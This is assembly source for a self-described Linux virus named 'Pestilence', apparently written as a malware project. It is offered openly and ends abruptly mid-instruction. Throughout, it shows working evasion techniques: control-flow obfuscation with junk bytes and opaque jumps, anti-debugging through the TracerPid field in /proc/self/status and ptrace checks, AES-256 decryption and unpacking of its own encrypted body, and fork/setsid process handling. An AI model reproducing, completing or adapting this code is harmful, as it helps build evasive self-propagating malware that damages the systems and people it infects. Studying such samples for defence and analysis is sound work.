; REGISTERS : %m6, %m7, %m8, %vsp
; Do not touch those registers as they contain sensitive data
; about different memory pages addresses.

%include "inc.asm"

DEFAULT rel
GLOBAL _start

SECTION .text

    nop
_start:
    nop
    call        _virus

align 16
_signature:
    .start: db "Pestilence version 1.0 (c)oded by mamaurai:xchalle - "
    .startsize: equ $-.start
    .index: times 0x4 db 0x30
    db ':'
    .key_preview: times 0x8 db 0x30
    db 0x00
align 16
_eos:

;- GLOBAL variables ----------------------------------
signature_len: equ _eos-_signature
non_packed_len: equ _packed-_start
virus_len: dd 0x00000000
entrypoint: dq 0x0000000000000000
;-----------------------------------------------------
; PUBLIC PART (This part isn't encrypted or packed).
_public:
;-----------------------------------------------------
; Public Structures (Structures used by public
; functions).
struc _AESD_OFF
    .key_exp    resb 0x100
    .startaddr  resq 0x1
    .length     resq 0x1
    .keyaddr    resq 0x1
endstruc
struc _UEC_OFF
    .mapaddr    resq 0x1
    .key        resb 0x20
endstruc
;-----------------------------------------------------
; Public Preprocessor Values.
tracerline_size: equ 11
columns_size: equ 7
lines_size: equ 5
debugging_size: equ 23
keycreation_len: equ _decrypt-_virus
;-----------------------------------------------------
; Public Variables.
VARIABLES public
columns:        db "COLUMNS", 0x0
lines:          db "LINES", 0x0
procself:       db "/proc/self/status", 0x0
tracerline:     db "TracerPid:", 0x9
debugging:      db "[DEBUGGER IS RUNNING..]"
non_encrypted_len: equ _decrypt-_start
key: times 32 db 0x00
;-----------------------------------------------------
; Public code.
;-----------------------------------------------------
_virus:
    jmp         ..@orOoRWtOorcJ
..@0aLVTe3IjNOd:
    call        Strncmp
    test        rax, rax
    jz          ..@p7cP8IQj0i36
    jmp         $+3
db 0x0f
    jmp         $+5
db 0x31, 0xab, 0x5b
    jmp         ..@7y3nhMB1hGNQ
..@nXgt5bxZrhgk:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    mov         rax, rax
    push        rbx
%endif
%endif
    js          ..@Et9u9eEbtFM6
    jns         ..@Et9u9eEbtFM6
..@TrKX6EFpxKuP:
    mov         rbp, rbp
    jmp         $+4
db 0x3a, 0x5d
    jmp         $+4
db 0x99, 0xca
    jmp         ..@CCI0wdwbsfzn
..@LnZFDHJ2knoD:
    pslldq      xmm4, 0x4
    pxor        xmm1, xmm4
    pxor        xmm1, xmm2
    je          ..@RRIbyau6sirU
    jne         ..@RRIbyau6sirU
..@lqHIpt0oUozy:
    lea         rdi, [rsp+_UEC_OFF.key]
    push        rcx
    jmp         ..@mVH9r7KC85GL
..@B5f2Jz6I0m9X:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    mov         r1, rax
%endif
%endif
    jmp         $+5
db 0x7f, 0x3e, 0x4b
    jb          ..@vwooUftdjWg0
    jae         ..@vwooUftdjWg0
..@t6yO7vqkKpSV:
    mov         r4, m4
    jmp         $+3
db 0xea
    jmp         $+5
db 0x9b, 0x43, 0x15
    jmp         $+5
db 0x13, 0xc7, 0x4c
    jmp         $+4
db 0x8e, 0x9b
    jmp         ..@Wy8vhd2j2Nas
..@mn4Jb79L5w5X:
    xor         r1, r1
    jmp         $+5
db 0xb0, 0xec, 0x55
    jmp         ..@or3wA2z9EvAI
..@oDOflLJZKsyK:
    jl          ..@07KEfpEYcmmF
    jb          ..@mUSDB3SbojfP
    jae         ..@mUSDB3SbojfP
..@pYnjsSjEEBrA:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    mov         rax, SYS_GETPPID
%endif
%endif
    jb          ..@jEbqVvNKTA1J
    jae         ..@jEbqVvNKTA1J
..@ZBhJSFGs9vFj:
    xor         rbx, rbx
    jmp         ..@iqiXI8xrJe8j
..@VG5IPEqJELzo:
    push        rbp
    mov         rbp, rsp
    jmp         $+4
db 0xd2, 0xc1
    jmp         ..@6hpMWKc3DD4E
..@lVZWIZ4Hg5eV:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    mov         rax, SYS_GETPPID
%endif
%endif
    jmp         $+5
db 0xa1, 0x31, 0x09
    jmp         $+5
db 0x6a, 0xd7, 0x56
    jmp         ..@StyYKVTyRoWD
..@AYATpk91ftnM:
    pop         rsi
    xor         rax, rax
    jmp         ..@jdc16otcraye
..@zbpDWyWJNOpD:
    xchg        rax, rax
    jb          ..@M1n6FeQYe4wZ
    jae         ..@M1n6FeQYe4wZ
..@4bJuKzcKaFGZ:
    movdqu      OWORD [rsp+0xc0],xmm0
    movdqu      xmm1, OWORD [rsp+0xd0]
    aesimc      xmm0,xmm1
    jl          ..@JKpvX5RO5lMy
    jge         ..@JKpvX5RO5lMy
..@fR1kDjWfPlV9:
    pop         rdi
    jl          ..@2RKtsyAWKK1M
    jge         ..@2RKtsyAWKK1M
..@qM8RA48RHAON:
%ifndef ENABLE_DEBUGGING
    syscall
%endif
    jmp         ..@eMqrfRh0QYC3
..@ZpnRFK1ojg8U:
    aesdec      xmm0, xmm1
    xchg        rbx, rbx
    jmp         $+5
db 0x41, 0xdc, 0xea
    jb          ..@RBIrACHBi6jn
    jae         ..@RBIrACHBi6jn
..@nsuOtkAFzEXV:
    xchg        rsp, rsp
    aeskeygenassist xmm2, xmm3, 0x10
    jmp         $+5
db 0xac, 0x4c, 0x22
    jmp         ..@gknrTHxQEBog
..@hxpkQibYfY5k:
    xchg        rbx, rbx
    jmp         $+4
db 0x4c, 0x75
    jmp         $+5
db 0x43, 0x68, 0xff
    jb          ..@KnfLuqdABxEv
    jae         ..@KnfLuqdABxEv
..@t2ViZkk1IpWF:
    ret
    jl          Aes256Decryption
    jge         Aes256Decryption
..@6O1Qa9E0LJag:
    push        rsi
    jmp         $+3
db 0x7e
    jmp         $+3
db 0x40
    jl          ..@Y3gOpF1wb2MB
    jge         ..@Y3gOpF1wb2MB
..@6JLMKiCjc7l8:
    mov         rsi, QWORD [rsp+_AESD_OFF.startaddr]
    jmp         $+3
db 0x1d
    jmp         $+5
db 0x34, 0x4c, 0x38
    je          ..@MnSp9olmzIMo
    jne         ..@MnSp9olmzIMo
..@Y3gOpF1wb2MB:
    rep         nop
    jb          ..@AYATpk91ftnM
    jae         ..@AYATpk91ftnM
..@DittWc1Hav0L:
%ifndef ENABLE_DEBUGGING
    jnz         ..@t4PI6VLOitT0
%endif
    jb          ..@qP0QHp799uhn
    jae         ..@qP0QHp799uhn
..@biR2IgXIv3H5:
    pop         r3
    jmp         ..@N7uS2D1GvHLw
..@XDVAWKcNoytA:
%ifndef ENABLE_DEBUGGING
    jne         ..@B5f2Jz6I0m9X
%endif
    jmp         $+5
db 0xed, 0xc9, 0x87
    jmp         ..@CuxhrpvnFfvX
..@zEw34wHbiQ8f:
    syscall
    cmp         eax, 0x00
    je          ..@pPsWpyBclGtK
    jmp         $+5
db 0xb9, 0xe0, 0x41
    jmp         ..@mn4Jb79L5w5X
..@R6x3JpRskwZ3:
    ret
    jmp         Memmem
..@YtOhiyi9Z4dp:
    mov         rcx, QWORD [rsp]
    cmp         QWORD [rsp+2*bytes], rcx
    jmp         $+5
db 0xe7, 0xfe, 0xf6
    jmp         ..@zTwhPtVQKEQb
..@tWOWLE3nXzsF:
%ifndef ENABLE_DEBUGGING
    mov         r5, rax
%endif
    jb          ..@wPk7KvFdAncY
    jae         ..@wPk7KvFdAncY
..@OoSdwq0aCqSp:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    push        rdx
%endif
%endif
    jmp         $+3
db 0x4c
    jmp         $+5
db 0x8a, 0x93, 0xa5
    jl          ..@F9nggxhe7HMZ
    jge         ..@F9nggxhe7HMZ
..@35ki5TkAox5k:
    jmp          DecryptExecutableCode
    jmp         $+5
db 0x28, 0x0c, 0xe4
    jl          Strlen
    jge         Strlen
..@M1n6FeQYe4wZ:
    mov         rsi, r5
    jl          ..@lqHIpt0oUozy
    jge         ..@lqHIpt0oUozy
Strlen:
    jmp         ..@B2H0zMi6qL0h
..@4JjRRN41KC34:
    xor         r2, r2
    jmp         ..@WCosYQkNP283
..@T0slJvvTeDmH:
    call        Processes
    xor         r1, r1
    call        ExitProgram
    js          ..@jzGljwfxM8eP
    jns         ..@jzGljwfxM8eP
..@XOiRg2NZlLeE:
    movdqu      xmm3, [rdi+0x10]
    movdqa      OWORD [rsi], xmm1
    movdqa      OWORD [rsi+0x10], xmm3
    je          ..@70IcnKPFtQaX
    jne         ..@70IcnKPFtQaX
..@XQBCsKwxvROB:
    aesimc      xmm0,xmm1
    movdqu      OWORD [rsp+0xa0],xmm0
    jl          ..@Fd82tfkq6sRE
    jge         ..@Fd82tfkq6sRE
..@M2N7F2XiA2br:
    pop         rdx
    jmp         $+5
db 0x30, 0xdc, 0x00
    jmp         ..@nn6nAPlSw18r
..@1JSFX5isd3Up:
    mov         rdi, rdi
    push        r1
    push        r2
    jmp         $+4
db 0xa0, 0x2c
    jb          ..@VruHmxKUjfNC
    jae         ..@VruHmxKUjfNC
..@rTWmSed5BYKJ:
    pslldq      xmm4, 0x4
    pxor        xmm1, xmm4
    pslldq      xmm4, 0x4
    jmp         ..@AHomcNdwUCTd
..@t45mUfHCfjL2:
    pop         rax
    jmp         $+4
db 0x7c, 0xb1
    jmp         ..@bxuqFBkZpCcn
..@Kg07PLGnt8oW:
    xchg        rbx, rbx
    jmp         $+4
db 0xb0, 0x36
    jmp         ..@juW5VLdstvEk
..@75DyucRSeT1T:
    xchg        rcx, rcx
    jmp         ..@mEPgwQ5PgBHc
..@513h6dUlMfLn:
    aesimc      xmm0,xmm1
    rep         nop
    js          ..@h03cwltRbgP8
    jns         ..@h03cwltRbgP8
..@BD0O7rBYxYmX:
    call        ..@2UskHexg6DH2
    rep         nop
    js          ..@8nDYCPPKuJOz
    jns         ..@8nDYCPPKuJOz
..@4rzfZAWQ2RFz:
    jne         ..@ruxryoGXZ1v8
    js          ..@FTUnVPvuxuUs
    jns         ..@FTUnVPvuxuUs
..@rrSrHmJC4SWc:
    push        r2
    push        r3
    push        r4
    jmp         ..@oEaIuc3M3gZQ
..@utJPNZBWVhiT:
    movdqu      xmm1, OWORD [rsp+0x70]
    aesimc      xmm0,xmm1
    jmp         ..@b74M7YaNe7an
..@VGav1N1xqDwG:
    xor         rax, rax
    jmp         ..@8Yl58P131umr
    push        rax
    jmp         ..@RxjzEYPxJpnm
..@wjfkbOZ4dcN2:
    and         rsp, 0xfffffffffffffff0
    mov         QWORD [rsp+_AESD_OFF.startaddr], r1
    mov         QWORD [rsp+_AESD_OFF.length], r2
    jmp         $+3
db 0xe9
    jmp         ..@oBJ2XIqbzevU
..@UmIUWPzV7oF8:
    xor         rax, rax
    mov         rax, SYS_SETSID
    je          ..@7EVoj9oBu4dO
    jne         ..@7EVoj9oBu4dO
..@A0Cg8lJekFgS:
    aeskeygenassist xmm2, xmm3, 0x40
    jl          ..@TAVvhlEG2MLx
    jge         ..@TAVvhlEG2MLx
..@jdc16otcraye:
    mov         rax, SYS_FORK
    jmp         $+5
db 0x7d, 0xbc, 0x9c
    jb          ..@nzaP0uYATidG
    jae         ..@nzaP0uYATidG
..@igH5PRpuZtAZ:
    movdqu      xmm1, OWORD [rsp+0x20]
    aesdec      xmm0, xmm1
    jmp         $+3
db 0xdf
    jb          ..@xnWCpg37QBqE
    jae         ..@xnWCpg37QBqE
..@JvsOSXGJbK33:
    movdqa      OWORD [rsi+0x30], xmm3
    aeskeygenassist xmm2, xmm3, 0x2
    call        ..@nn6nAPlSw18r
    jmp         $+5
db 0xd9, 0x92, 0xfb
    je          ..@zIFf1afbVXRk
    jne         ..@zIFf1afbVXRk
..@2LvLgYWLtxnC:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    sub         rsp, bytes
    mov         QWORD [rsp], 0x00
%endif
%endif
    jl          ..@rxpxjS5mlz5Q
    jge         ..@rxpxjS5mlz5Q
..@JF3z8WzTDJbs:
%ifndef ENABLE_DEBUGGING
    mov         r2, r5
%endif
    jb          ..@N1rCdS0YjHxV
    jae         ..@N1rCdS0YjHxV
..@vJHPmbRfdovh:
%ifndef ENABLE_DEBUGGING
    xchg        rsp, rsp
    VAR         public, debugging
%endif
    jmp         ..@JF3z8WzTDJbs
..@laSLOUseA6w4:
    jnz         ..@SPmC29OVrCsE
    push        rdx
    jmp         ..@euPRQdhAZKMp
..@ECewkktzoZF4:
    pxor        xmm3, xmm4
    pslldq      xmm4, 0x4
    mov         rcx, rcx
    jl          ..@SY5VzlOLUAAg
    jge         ..@SY5VzlOLUAAg
..@IoLscLiPrmuP:
    cmp         BYTE [r1 + rax], 0x0
    jb          ..@XVNMoM368Pwk
    jae         ..@XVNMoM368Pwk
..@58G4gQKodsZw:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    push        rbx
    rep         nop
%endif
%endif
    js          ..@zng0zwMgdgn8
    jns         ..@zng0zwMgdgn8
..@Kj8lqiPAQ6nu:
    aesdec      xmm0, xmm1
    jl          ..@igH5PRpuZtAZ
    jge         ..@igH5PRpuZtAZ
..@ZzNnVG5I9Aqp:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    xchg        rax, rax
    and         rax, 0xff00
    shr         eax, 8
%endif
%endif
    jmp         $+5
db 0xfd, 0xd0, 0x76
    jmp         $+5
db 0x6b, 0x77, 0xaf
    jl          ..@hkN8QrIbNCTu
    jge         ..@hkN8QrIbNCTu
..@2dKq3trCRcFX:
    add         rax, 0x20
    jmp         $+4
db 0xf8, 0x6f
    jb          ..@zHY19Kqr6vIZ
    jae         ..@zHY19Kqr6vIZ
..@WCosYQkNP283:
    xor         r3, r3
    jmp         $+4
db 0x72, 0x08
    jmp         ..@IFZ6IWFLnykF
..@ZzvJxeUZ5oko:
    ret
    js          GetEnv
    jns         GetEnv
..@ZsisragwfrsX:
%ifndef ENABLE_DEBUGGING
    sub         rsp, 0x1000
%endif
    jmp         $+3
db 0x67
    je          ..@SJx6kzXXBuB8
    jne         ..@SJx6kzXXBuB8
..@StyYKVTyRoWD:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    syscall
    mov         r1, rax
%endif
%endif
    jmp         $+5
db 0x9d, 0xda, 0x80
    jmp         $+5
db 0x68, 0xcc, 0x26
    jl          ..@QtEFuY1g1YAI
    jge         ..@QtEFuY1g1YAI
..@FQn6ISIWTqD7:
    pop         rdx
    VAR         public, entrypoint
    jmp         ..@z3FvXSORwe1O
..@0XrY7jMt4wRy:
    movdqu      xmm1, OWORD [rsp+0xa0]
    jb          ..@ZpnRFK1ojg8U
    jae         ..@ZpnRFK1ojg8U
..@2UskHexg6DH2:
    pshufd      xmm2, xmm2, 0xaa
    movdqa      xmm4, xmm3
    jmp         $+3
db 0xae
    jmp         $+4
db 0x04, 0x19
    jl          ..@Kd5wOGkOka8z
    jge         ..@Kd5wOGkOka8z
..@DnxlqMrNJC8o:
    GGLOBAL     entrypoint
    jmp         $+4
db 0x16, 0x69
    jb          ..@SD4ZNuP3dk93
    jae         ..@SD4ZNuP3dk93
..@mt81Z3W6Ccn5:
%ifndef ENABLE_DEBUGGING
    call        Memmem
    add         rax, tracerline_size
%endif
    js          ..@M2WHk6gmIQbQ
    jns         ..@M2WHk6gmIQbQ
..@I6AqKy6Kilze:
    call        Aes256KeyCreation
    jmp         $+5
db 0x2c, 0x1b, 0x16
    jmp         $+5
db 0xd8, 0xda, 0xbf
    jmp         ..@B6dHOCtuFj66
..@blVpuK0s9j3o:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    xor         r3, r3
    xor         r4, r4
%endif
%endif
    js          ..@u3fCoB9VPkMt
    jns         ..@u3fCoB9VPkMt
..@QkH5b3PLg0Km:
    mov         rax, rax
    cmp         eax, 0x0
    js          ..@oDOflLJZKsyK
    jns         ..@oDOflLJZKsyK
..@uWGaRGYcZp0x:
    mov         r1, r5
    mov         rsi, rsi
    push        rdx
    jmp         ..@FQn6ISIWTqD7
..@CEhMxkApln0X:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    push        rsi
%endif
%endif
    jmp         $+5
db 0x13, 0x0b, 0x86
    jmp         $+3
db 0xef
    jb          ..@z73OrPHU6TZw
    jae         ..@z73OrPHU6TZw
..@2Cmr8d1JVyyN:
%ifndef ENABLE_DEBUGGING
    VAR         public, tracerline
    mov         r3, r5
    mov         r4, tracerline_size
%endif
    jmp         $+4
db 0xaa, 0xae
    jl          ..@mt81Z3W6Ccn5
    jge         ..@mt81Z3W6Ccn5
..@rENHKAB2qQ6E:
    aesdeclast  xmm0, xmm1
    movdqu      [rsi+rcx], xmm0
    add         rcx, 0x10
    jmp         $+4
db 0x0c, 0x81
    je          ..@rv8PmJyj4Ttr
    jne         ..@rv8PmJyj4Ttr
..@LEX1QmbzdJpS:
%ifndef ENABLE_DEBUGGING
    jl          ..@B5f2Jz6I0m9X
%endif
    jl          ..@tWOWLE3nXzsF
    jge         ..@tWOWLE3nXzsF
..@ME4Es11sYgp8:
    aeskeygenassist xmm2, xmm1, 0x0
    jmp         $+5
db 0x20, 0x6e, 0xa1
    jmp         $+3
db 0x60
    jmp         ..@RRC1NkfUY8Zd
..@ImuwW2GatDDR:
    mov         m4, rdi
    call        AntiDebugging
    jmp         $+5
db 0xf3, 0x27, 0xe9
    jl          ExitProgram
    jge         ExitProgram
..@in4dfQVRywkM:
    xor         rax, rax
    jmp         $+5
db 0xfb, 0xbc, 0xc7
    jmp         $+4
db 0xfe, 0xec
    jb          ..@OdyWjsaLm0lA
    jae         ..@OdyWjsaLm0lA
..@zng0zwMgdgn8:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    push        rdx
    pop         rdx
    pop         rbx
%endif
%endif
    jb          ..@U82AeBkjJym0
    jae         ..@U82AeBkjJym0
..@v9nEXPg9Pmm8:
    and         r3, 0ffffffffffffffe0h
    push        r3
    movdqu      xmm0, OWORD [r1]
    jmp         ..@wTC1PF3VYGrQ
..@vUdB9inx1DF9:
    or          r2, PAGE_SIZE-1
    jmp         $+5
db 0x42, 0xcf, 0x15
    jmp         ..@QABfKuyy1T53
..@QuhPb68HEzUQ:
    sub         QWORD [rsp+2*bytes], rdx
    jmp         ..@e6QgXwGJBra3
    je          ..@SWbOTUhJpRRP
    jne         ..@SWbOTUhJpRRP
..@A9G8PPY7DEfV:
    add         rsp, 4*bytes
    jmp         $+5
db 0xbf, 0x00, 0x25
    jb          ..@MaLeETN5ov45
    jae         ..@MaLeETN5ov45
..@RdtWP6eAqazT:
    syscall
    xor         rax, rax
    mov         rax, SYS_FORK
    js          ..@1d2P4OHBalxH
    jns         ..@1d2P4OHBalxH
..@u2Hj5UNAUvD4:
    sub         r4, r1
    jmp         ..@VfVZVGNpGh4e
..@RXwUGGQmke6s:
    movdqu      xmm1, OWORD [rsp+0xe0]
    jmp         $+5
db 0x8b, 0xcd, 0xbb
    jmp         $+5
db 0x7f, 0x5c, 0x97
    je          ..@sF3ki7u7pM7i
    jne         ..@sF3ki7u7pM7i
..@5tNaQmJ6vabH:
    xchg        rsi, rsi
    call        ..@2UskHexg6DH2
    mov         rbp, rbp
    jmp         ..@UsuE0xReDwso
..@SQUtOOMMUeb7:
    xor         r4, r4
    mov         rdi, rdi
    mov         rax, SYS_WAIT4
    jmp         ..@Upg4ZQKmix0y
..@iqiXI8xrJe8j:
    mov         rax, rbx
    mov         rbp, rbp
    jmp         $+5
db 0x34, 0xd3, 0x02
    jl          ..@A9G8PPY7DEfV
    jge         ..@A9G8PPY7DEfV
..@e28fi9j67w51:
    ret
    js          Aes256KeyCreation
    jns         Aes256KeyCreation
..@h03cwltRbgP8:
    movdqu      OWORD [rsp+0x80],xmm0
    movdqu      xmm1, OWORD [rsp+0x90]
    jmp         $+4
db 0xfc, 0x1e
    jmp         $+5
db 0x59, 0x49, 0xde
    js          ..@ArEkOeQRfT8l
    jns         ..@ArEkOeQRfT8l
..@BJEoLidoXV5I:
    xor         rax, rax
    jmp         $+4
db 0x82, 0xbb
    jmp         $+5
db 0x54, 0x65, 0x48
    jmp         ..@SPmC29OVrCsE
..@zHY19Kqr6vIZ:
    cmp         rax, QWORD [rsp]
    jl          ..@c88YFizkxady
    movdqu      OWORD [r1], xmm0
    jmp         $+4
db 0xb0, 0xcd
    js          ..@EiI73cP3DkrH
    jns         ..@EiI73cP3DkrH
..@hGjOxMXtx64h:
    movdqa      OWORD [rsi+0xb0], xmm3
    jmp         ..@TrKX6EFpxKuP
..@UTdFNAGg6H3W:
    push        r1
    jb          ..@rrSrHmJC4SWc
    jae         ..@rrSrHmJC4SWc
..@U82AeBkjJym0:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    mov         rax, SYS_GETPPID
    syscall
    xchg        rcx, rcx
%endif
%endif
    jl          ..@O6m1wJwu6au5
    jge         ..@O6m1wJwu6au5
..@XV4DDIBrdUDk:
    call        Aes256Decryption
    jmp         $+5
db 0x35, 0xa9, 0x02
    js          ..@lBz7mUsWuXX0
    jns         ..@lBz7mUsWuXX0
..@7IYSweGr6r0D:
    xor         rax, rax
    jmp         ..@k0nlRsmY8Ky4
..@PaKOreBc2mJz:
    aesimc      xmm0,xmm1
    movdqu      OWORD [rsp+0x20],xmm0
    jmp         $+5
db 0xa0, 0x0d, 0x85
    je          ..@Kg07PLGnt8oW
    jne         ..@Kg07PLGnt8oW
..@d9XLGF84JowH:
    movdqu      xmm1, OWORD [rsp+0x50]
    aesdec      xmm0, xmm1
    jmp         ..@tkpnOnxLlu1N
..@ZA8hvkFRvkbP:
%ifndef ENABLE_DEBUGGING
    mov         r2, 0x200
%endif
    jmp         $+5
db 0xb2, 0xd1, 0xcd
    jl          ..@2Cmr8d1JVyyN
    jge         ..@2Cmr8d1JVyyN
..@O6m1wJwu6au5:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    mov         r1, 17
    mov         r2, rax
%endif
%endif
    jmp         ..@UGm7uZFPfIXK
..@tkpnOnxLlu1N:
    movdqu      xmm1, OWORD [rsp+0x40]
    push        rsi
    pop         rsi
    jb          ..@zBQDeJZHQ7cg
    jae         ..@zBQDeJZHQ7cg
..@MiidWcuPNjAl:
    movdqu      xmm1, OWORD [rsp+0x30]
    je          ..@X84G25dzF1At
    jne         ..@X84G25dzF1At
..@nn6nAPlSw18r:
    push        rdx
    jmp         $+5
db 0x23, 0xaa, 0x7d
    jmp         $+4
db 0x79, 0xd8
    jmp         ..@M8ZW98MwwSk4
..@fHVEbWHboUEo:
    rep         nop
    jmp         $+4
db 0x55, 0x2c
    js          ..@5tNaQmJ6vabH
    jns         ..@5tNaQmJ6vabH
..@AdnNSEmHLOeR:
    pop         r1
    jmp         ..@e28fi9j67w51
..@7y3nhMB1hGNQ:
    add         r4, bytes
    jb          ..@taPGC2gDa1g3
    jae         ..@taPGC2gDa1g3
..@kwdCHQRHvuLu:
    pop         rdx
    add         r2, 1
    dec         r3
    js          ..@laSLOUseA6w4
    jns         ..@laSLOUseA6w4
..@ZHA7xxDNOPMk:
    movdqa      OWORD [rsi+0xd0], xmm3
    push        rdi
    pop         rdi
    jmp         $+3
db 0x37
    jmp         ..@A0Cg8lJekFgS
..@rxpxjS5mlz5Q:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    mov         r1, rax
%endif
%endif
    jmp         $+4
db 0x94, 0x77
    jmp         $+3
db 0xe7
    jmp         $+3
db 0xaa
    jmp         $+5
db 0x5f, 0x03, 0x4e
    jl          ..@XblOWWaJEXvK
    jge         ..@XblOWWaJEXvK
..@taPGC2gDa1g3:
    jmp         ..@Wy8vhd2j2Nas
    jmp         $+5
db 0x46, 0xde, 0x1c
    jmp         ..@dkJK5gxBcywJ
..@cDXcrS4n0Zwg:
    xchg        rcx, rcx
    jmp         $+3
db 0x7d
    js          ..@6JLMKiCjc7l8
    jns         ..@6JLMKiCjc7l8
..@AXu45WLXOGmM:
    aeskeygenassist xmm2, xmm1, 0x0
    jmp         $+3
db 0xda
    jb          ..@BD0O7rBYxYmX
    jae         ..@BD0O7rBYxYmX
..@oBJ2XIqbzevU:
    mov         QWORD [rsp+_AESD_OFF.keyaddr], r3
    mov         rsi, rsp
    mov         rdi, QWORD [rsp+_AESD_OFF.keyaddr]
    jmp         ..@yXVBiZNeG2Nq
Strncmp:
    jmp         ..@1JSFX5isd3Up
..@xxENSkvnPx4a:
    movdqa      OWORD [rsi+0x90], xmm3
    mov         rdi, rdi
    jb          ..@nsuOtkAFzEXV
    jae         ..@nsuOtkAFzEXV
..@QtEFuY1g1YAI:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    xor         r2, r2
    xor         r3, r3
%endif
%endif
    jmp         $+4
db 0xf0, 0x75
    jmp         $+5
db 0xc0, 0xba, 0xa9
    jb          ..@8EXmJ9Gl3EIL
    jae         ..@8EXmJ9Gl3EIL
..@2Whxcle5awag:
    call        ..@nn6nAPlSw18r
    jmp         $+4
db 0x0e, 0xfc
    jmp         $+4
db 0x97, 0x98
    jl          ..@9nV47NSKZkIT
    jge         ..@9nV47NSKZkIT
..@zTwhPtVQKEQb:
    push        rsi
    pop         rsi
    jmp         ..@jbYHD9Lk1jRj
..@c88YFizkxady:
    movdqu      xmm2, OWORD [r2+rax]
    jmp         $+5
db 0xc3, 0x27, 0xfc
    jmp         ..@HcwaPhK2oSY3
..@ESUi4obNizJ8:
    jne         ..@jzGljwfxM8eP
    GGLOBAL     _packed
    mov         m8, r5 
    jl          ..@T0slJvvTeDmH
    jge         ..@T0slJvvTeDmH
..@q4gs07qZueyA:
    movdqu      xmm1, OWORD [rsp+0x80]
    aesdec      xmm0, xmm1
    movdqu      xmm1, OWORD [rsp+0x70]
    jmp         $+4
db 0xe4, 0x74
    jmp         ..@yxwie5A3GSuO
..@K1JHO9HpVqnc:
    mov         r4, r5
    jmp         $+5
db 0xc7, 0xcc, 0x6b
    js          ..@u2Hj5UNAUvD4
    jns         ..@u2Hj5UNAUvD4
..@13frWGdJlIBo:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    push        rbx
    pop         rbx
    mov         rdi, rdi
%endif
%endif
    je          ..@r6Ngn1QzvXr4
    jne         ..@r6Ngn1QzvXr4
..@yabAmNpd4Fui:
    mov         rdx, rdx
    push        rdx
    pop         rdx
    jb          ..@ll75SuIvokLv
    jae         ..@ll75SuIvokLv
..@Lh4IDqqJb1sn:
    mov         rbx, rbx
    jmp         $+3
db 0xf2
    jmp         ..@OF6IWSFKAkT8
..@lBz7mUsWuXX0:
    jmp         UnpackExecutableCode
    jmp         $+5
db 0x20, 0x58, 0x4c
..@Kd5wOGkOka8z:
    pslldq      xmm4, 0x4
    jmp         $+5
db 0x10, 0x90, 0xb6
    jb          ..@E4fIHvK33Rft
    jae         ..@E4fIHvK33Rft
..@jEbqVvNKTA1J:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    syscall
    mov         r1, 16
    mov         r2, rax
%endif
%endif
    jmp         $+3
db 0xc0
    jmp         $+4
db 0x4f, 0x1f
    jmp         ..@blVpuK0s9j3o
..@hjK9VoKwhW9c:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    syscall
    cmp         rax, 0x00
    jle         ..@B5f2Jz6I0m9X
%endif
%endif
    jmp         $+4
db 0x17, 0xb8
    jmp         $+5
db 0xd9, 0x58, 0x3f
    jmp         ..@58G4gQKodsZw
Memmem:
    jmp         ..@UTdFNAGg6H3W
..@VfVZVGNpGh4e:
    GGLOBAL     virus_len
    mov         rdx, rdx
    mov         r2d, DWORD [r5]
    jmp         ..@oJRKAFu2FClK
..@P7Tn0RYVsjfi:
    movdqu      OWORD [rsp+0xb0],xmm0
    movdqu      xmm1, OWORD [rsp+0xc0]
    push        rdx
    jmp         ..@1bfw035GeDIV
..@e8V82gDXLg6o:
    and         r5, PAGE_SIZE-1
    test        r5, r5
    jz          ..@7IYSweGr6r0D
    js          ..@vUdB9inx1DF9
    jns         ..@vUdB9inx1DF9
..@wTC1PF3VYGrQ:
    push        rdx
    pop         rdx
    movdqu      xmm1, OWORD [r1+0x10]
    jmp         $+3
db 0x94
    jb          ..@jmSpTpNOw8cT
    jae         ..@jmSpTpNOw8cT
..@Upg4ZQKmix0y:
    syscall
    add         rsp, bytes
    xchg        rsi, rsi
    jmp         $+4
db 0x8a, 0xcd
    jmp         ..@BKHQORPqrshD
..@oS8K53abalUG:
    mov         rbx, rbx
    js          ..@anrap3mvxd3R
    jns         ..@anrap3mvxd3R
..@aw91mK9jNOes:
    mov         rsi, rsi
    jmp         ..@o1JldI7Wo5w9
..@X84G25dzF1At:
    xchg        rdi, rdi
    je          ..@Kj8lqiPAQ6nu
    jne         ..@Kj8lqiPAQ6nu
..@1bfw035GeDIV:
    pop         rdx
    jl          ..@t0MxslBHqd5o
    jge         ..@t0MxslBHqd5o
..@duevSDcK244v:
    aesimc      xmm0,xmm1
    jmp         ..@JMXSAE4HXWFm
..@yXVBiZNeG2Nq:
    call        Aes256KeyExpansion
    jmp         ..@Pwu2YH4MTMMy
..@6hpMWKc3DD4E:
    sub         rsp, _AESD_OFF_size+0x100
    xchg        rsp, rsp
    jmp         $+3
db 0x9f
    jmp         ..@wjfkbOZ4dcN2
..@jetOhpvSfCkS:
    mov         rcx, 0x8
    push        rdi
    push        rbx
    jmp         $+4
db 0xc2, 0x3c
    jmp         $+4
db 0xae, 0x5d
    jmp         ..@5jEZVEXHhpOX
..@t4PI6VLOitT0:
%ifndef ENABLE_DEBUGGING
    xor         rax, rax
    mov         r3, debugging_size
%endif
    je          ..@vJHPmbRfdovh
    jne         ..@vJHPmbRfdovh
..@OdyWjsaLm0lA:
    pop         r3
    pop         r2
    jmp         $+3
